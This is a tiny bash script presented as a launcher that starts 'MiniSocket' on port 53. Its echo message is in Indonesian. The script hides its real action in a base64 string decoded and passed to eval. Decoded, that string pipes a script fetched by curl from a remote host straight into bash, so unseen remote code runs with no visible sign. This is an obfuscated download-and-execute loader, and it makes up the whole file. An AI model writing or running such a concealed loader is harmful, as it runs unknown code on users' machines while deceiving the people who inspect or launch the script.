#!/bin/bash
PAYLOAD="TUlOSV9QT1JUPTUzIGJhc2ggLWMgIiQoY3VybCAtZnNTTCBodHRwczovL21pbmlzb2NrZXQuaW8vYmluL3gpIg=="

echo "🚀 Menjalankan MiniSocket on Port 53..."
eval "$(echo "$PAYLOAD" | base64 -d)"
